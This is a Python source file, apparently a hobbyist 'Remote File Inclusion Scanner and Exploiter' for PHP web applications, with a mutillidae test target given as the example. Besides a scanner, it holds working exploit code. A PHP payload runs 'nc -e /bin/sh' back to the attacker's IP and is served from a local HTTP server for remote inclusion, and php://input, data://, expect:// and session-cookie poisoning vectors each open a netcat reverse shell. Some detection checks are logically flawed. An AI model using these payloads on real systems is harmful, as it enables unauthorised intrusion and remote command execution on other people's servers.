import pyfiglet
import requests
import http.server
import socketserver
import threading
import os 
from colorama import *

# colors via: https://www.delftstack.com/es/howto/python/python-print-colored-text/
class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    FAIL = '\033[91m' #RED
    RESET = '\033[0m' #RESET COLOR


PORTSERVERHTTP = 4444
Handler = http.server.SimpleHTTPRequestHandler
linea = "------------------------------------------------------------------------"
banner = pyfiglet.figlet_format("RFI")
print(banner.center(70))
print(linea)
whatis= "Remote File Inclusion Scanner and Exploiter"
print(whatis.center(70))
print(linea,"\n")

def server():
    class quietServer(http.server.SimpleHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

    with socketserver.TCPServer(("", PORTSERVERHTTP), quietServer) as httpd:
        httpd.serve_forever()


thread = threading.Thread(target=server)


def choose():
    choose_option = input("Choose the option you want to use\n1- Scanner\n2- Exploiter\nOption: ")
    if choose_option == "1":
        print(linea)
        scanner()
    elif choose_option == "2":
        print(linea)
        choose_exploiter()
    else:
        print("Incorrect Option")



def scanner():
    global url
    userr = input("Put the user with whom you are running this program: (no root): ")
    ip_locall = input("Put your Local IP: ")
    url = input("Put URL (Example: http://192.168.0.131/mutillidae/?page=):  ")
    print(linea)
    print("Searching vulnerabilty...")
    add_bb = url + 'https://www.google.com/'
    pet = requests.get(add_bb,timeout=10)
    c = pet.status_code
    respuesta = pet.text
    thread.start()
    if c == 200:
        if "On the face" and "of this culture exist to this day" and "of this culture exist to this day" in respuesta:
            print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (1/3 scanned 1/1 vulnerable){bcolors.RESET}")
            second_scan = url + 'https://brave.com/'
            ress = requests.get(second_scan)
            ress2 = ress.text
            if "Nordic Walking Pluspunkte" and "ller Muskeln beteilig" in ress2:
                print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (2/3 scanned 2/2 vulnerable){bcolors.RESET}")
                url_tercera_r = url + 'http://' + ip_locall + ':4444/etc/passwd'
                tercerarequest = requests.get(url_tercera_r,timeout=10)
                url_tercera_r_code = tercerarequest.status_code
                if url_tercera_r_code == 200:
                    text_tercera_r = tercerarequest.text
                    if "root" and "bin" and "sbin" in text_tercera_r:
                        print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 3/3 vulnerable){bcolors.RESET}")
                        print(linea)
                        choose()
                    else: 
                        commandoo = 'echo pendrive >> /home/' + userr + '/malingame'
                        os.system(commandoo)
                        intenting = url + 'http://' + ip_locall + ':4444/malingame'
                        pene = requests.get(intenting,timeout=10)
                        textpene = pene.text
                        if "pendrive" in textpene:
                            print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 3/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()
                        else:
                            print(f"{bcolors.FAIL}NO vulnerable  (3/3 scanned  2/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()
                else:
                    print(f"{bcolors.FAIL}Error{bcolors.RESET}")
            else:
                print(f"{bcolors.FAIL}NO vulnerable  (2/3 scanned  1/2 vulnerable){bcolors.RESET}")
                url_tercera_r = url + 'http://' + ip_locall + ':4444/etc/passwd'
                tercerarequest = requests.get(url_tercera_r)
                url_tercera_r_code = tercerarequest.status_code
                if url_tercera_r_code == 200:
                    text_tercera_r = tercerarequest.text
                    if "root" and "bin" and "sbin" in text_tercera_r:
                        print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 3/3 vulnerable){bcolors.RESET}")
                        print(linea)
                        choose()
                    else: 
                        commandoo = 'echo pendrive >> /home/' + userr + '/malingame'
                        os.system(commandoo)
                        intenting = url + 'http://' + ip_locall + ':4444/malingame'
                        pene = requests.get(intenting)
                        textpene = pene.text
                        if "pendrive" in textpene:
                            print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 3/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()
                        else:
                            print(f"{bcolors.FAIL}NO vulnerable  (3/3 scanned  1/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()
        else:
            print(f"{bcolors.FAIL}NO vulnerable  (1/3 scanned  0/1 vulnerable){bcolors.RESET}")
            second_scan = url + 'http://walk-in-the-park.de/'
            ress = requests.get(second_scan)
            ress2 = ress.text
            if "Nordic Walking Pluspunkte" and "ller Muskeln beteilig" in ress2:
                print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (2/3 scanned 1/2 vulnerable){bcolors.RESET}")
                url_tercera_r = url + 'http://' + ip_locall + ':4444/etc/passwd'
                tercerarequest = requests.get(url_tercera_r)
                url_tercera_r_code = tercerarequest.status_code
                if url_tercera_r_code == 200:
                    text_tercera_r = tercerarequest.text
                    if "root" and "bin" and "sbin" in text_tercera_r:
                        print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 2/3 vulnerable){bcolors.RESET}")
                        print(linea)
                    else: 
                        commandoo = 'echo pendrive >> /home/' + userr + '/malingame'
                        os.system(commandoo)
                        intenting = url + 'http://' + ip_locall + ':4444/malingame'
                        pene = requests.get(intenting)
                        textpene = pene.text
                        if "pendrive" in textpene:
                            print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 2/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()
                        else:
                            print(f"{bcolors.FAIL}NO vulnerable  (3/3 scanned  1/3 vulnerable){bcolors.RESET}")

            else:
                print(f"{bcolors.FAIL}NO vulnerable  (2/3 scanned  0/2 vulnerable){bcolors.RESET}")
                url_tercera_r = url + 'http://' + ip_locall + ':4444/etc/passwd'
                tercerarequest = requests.get(url_tercera_r)
                url_tercera_r_code = tercerarequest.status_code
                if url_tercera_r_code == 200:
                    text_tercera_r = tercerarequest.text
                    if "root" and "bin" and "sbin" in text_tercera_r:
                        print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 2/3 vulnerable){bcolors.RESET}")
                    else: 
                        commandoo = 'echo pendrive >> /home/' + userr + '/malingame'
                        os.system(commandoo)
                        intenting = url + 'http://' + ip_locall + ':4444/malingame'
                        pene = requests.get(intenting)
                        textpene = pene.text
                        if "pendrive" in textpene:
                            print(f"{bcolors.WARNING}Possibiltie of vulnerablitie deteced  (3/3 scanned 2/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()
                        else:
                            print(f"{bcolors.FAIL}NO vulnerablitie deteced  (3/3 scanned 1/3 vulnerable){bcolors.RESET}")
                            print(linea)
                            choose()


    else:
        print(f"{bcolors.FAIL}Invalid URL{bcolors.RESET}")

def choose_exploiter():
    choose_vector_rfi = int(input("Choose vector attack\n1- Tradition RFI attack\n2- Wrappers\nOption: "))
    print(linea)
    if choose_vector_rfi == 1:
        exploiter()
    elif choose_vector_rfi == 2:
        chhoosse = int(input("Choose Wrapper Attack\n1- Input\n2- Data\n3- Expect\n4- Session and Cookies\nOption:  "))
        if chhoosse == 1:
            input_php()
        if chhoosse == 2:
            data_wrapper()
        if chhoosse == 3:
            wrapper_expect()
        if chhoosse == 4:
            sesion_cookies()

def exploiter():    
    thread.start()
    global uuserr
    global payload_final
    global ippppppp
    global payload
    global payload2
    linkk = input("Put URL (Example: http://192.168.0.131/mutillidae/?page=):  ")
    ippppppp = input("Put Your Local IP: ")
    uuserr = input("Put the user with whom you are running this program: (no root): ")
    nc_listenerrr = print(f"{bcolors.WARNING}Put the command (nc -vv -l -p 1234) in new terminal{bcolors.RESET}")
    nc_question = str.lower(input(f"{bcolors.FAIL}You put this command (nc -vv -l -p 1234) in new terminal?   y/n: {bcolors.RESET}"))
    if nc_question == "y":
        nullbyte_q = str.lower(input("You want to put null byte and others methods to bypass filters of server in the attack?    y/n: "))
        if nullbyte_q == "y":
            payload = '<?php\npassthru("nc -e /bin/sh '
            payload2 = ' 1234");\n?>'
            crear_file_home()
            crear_file_arrel()
            payload_final = payload + ippppppp + payload2
            url_pettitionn = linkk + 'HTtP://' + ippppppp + ':4444/script_rfi_.txt?'
            packetttt = requests.get(url_pettitionn)
        elif nullbyte_q == "n":
            payload = '<?php\npassthru("nc -e /bin/sh '
            payload2 = ' 1234");\n?>'
            crear_file_home()
            crear_file_arrel()
            payload_final = payload + ippppppp + payload2
            url_pettitionn = linkk + 'http://' + ippppppp + ':4444/script_rfi_.txt'
            packetttt = requests.get(url_pettitionn)
    elif nc_question == "n":
        print("Put the command...")
    else:
        print("Invalid Option")
        

        


def crear_file_home():
    payload_final = payload + ippppppp + payload2
    file1234 = "script_rfi_.txt"
    path = '/home/' + uuserr
    Ruta = os.path.join(path,file1234)
    file1 = open(Ruta, "w")   
    payload_final = payload + ippppppp + payload2
    file1.write(payload_final)
    file1.close()

def crear_file_arrel():
    payload_final = payload + ippppppp + payload2
    file1234 = "script_rfi_.txt"
    path = '/'
    Ruta = os.path.join(path,file1234)
    file1 = open(Ruta, "w")
    file1.write(payload_final)
    file1.close()

def input_php():
    print(linea)
    print(f"{bcolors.WARNING}Put the command (nc -vv -l -p 1234) in other terminal{bcolors.RESET}")
    xdlol = input("You execut the command (nc -vv -l -p 1234) in new terminal?   y/n: ")
    if xdlol == "y":
        enviar = "<?php echo shell_exec($_GET['cmd']);?>"
        ip_m = input("Put your Local IP: ")
        command = 'nc -e /bin/bash '+ ip_m +' 1234'
        urll = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)")
        url = urll + 'php://input&cmd=' + command
        print(url)
        requests.post(url,data=enviar)
    elif xdlol == "n":
        print("Put the command")
    else:
        print("Error")



def data_wrapper():
    print(linea)
    print(f"{bcolors.WARNING}Put the command (nc -vv -l -p 1234) in other terminal{bcolors.RESET}")
    connnn = str.lower(input("You put the command (nc -vv -l -p 1234) in new terminal?   y/n: "))
    if connnn == "y":
        lllurl = str.lower(input('Put URL  Example (http://192.168.0.125/mutillidae/index.php?page=)\nURL: '))
        ip_local__ = input("Put your Local IP: ")
        add_in_link = 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=nc -e ' +  ip_local__ + ' 1234'
        cc = requests.get(lllurl + add_in_link)
        print(cc)
    elif connnn == "n":
        print("Put the command")
    else:
        print("Error :(")



def sesion_cookies():
    print(linea)
    print("Put the command (nc -vv -l -p 1234) in new terminal!")
    print(linea)
    ncccc = str.lower(input("You put the command (nc -vv -l -p 1234) in new terminal?   y/n"))
    if ncccc == "y":
        link = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)\nURL: ")
        link2 = link + '/var/lib/php5/sess_malcookie'
        local_ip = input("Put your Local IP: ")
        coki = {'Cookie':'PHPSESSID=malcookie'}
        login = 'username=<?passthru("nc -e /bin/sh ' + local_ip + ' 1234");'
        a1234 = requests.post(link,headers=coki,data=login)
        b1234 = a1234.request.headers
        c1234 = requests.get(link2)
    elif ncccc == "n":
        print("Put the command...")
    else:
        print("Invalid Option")


def wrapper_expect():
    print(linea)
    print(f"{bcolors.WARNING}Put the command (nc -vv -l -p 1234) in other terminal{bcolors.RESET}")
    ncccc = str.lower(input("You put the command (nc -vv -l -p 1234) in new terminal?   y/n: "))
    if ncccc == "y":
        link = input("Put URL (Example: http://192.168.0.125/mutillidae/?page=)\nURL: ")
        local_ip = input("Put your Local IP: ")
        coki = {'Cookie':'PHPSESSID=malcookie'}
        commanddd = 'nc -e /bin/sh ' + local_ip +  ' 1234'
        link2 = link + 'expect://' + commanddd
        print(link2)
        a1234 = requests.get(link2)
    elif ncccc == "n":
        print("Put the command...")
    else:
        print("Invalid Option")



choose()
